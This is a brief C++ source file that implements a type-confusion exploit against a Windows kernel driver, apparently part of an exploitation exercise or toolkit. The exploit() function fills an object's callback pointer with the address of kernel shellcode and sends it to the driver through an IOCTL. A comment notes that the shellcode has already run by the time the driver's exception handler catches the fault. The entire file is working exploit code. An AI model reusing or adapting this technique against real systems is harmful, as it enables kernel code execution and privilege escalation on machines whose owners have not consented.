#include "TypeConfusion.h"

bool 
ExploitTypeConfusion::exploit() {
	
	struct TypeConfusionObject {
		DWORD unknown;
		void *callback;
	};
	
	auto shellcodePointer = adjustPayloadEpilogue(0, true);
	
	TypeConfusionObject object = {
		0,
		*shellcodePointer
	};
	
	driver.SendIOCTL (
		ExploitTypeConfusion::Ioctl_Code,
		&object,
		sizeof(object)
	);
	
	// We return true here, as the driver's SEH will catch the exception
	// anyway, no matter the fact that our kernel shellcode has been launched
	// already.
	return true;
}
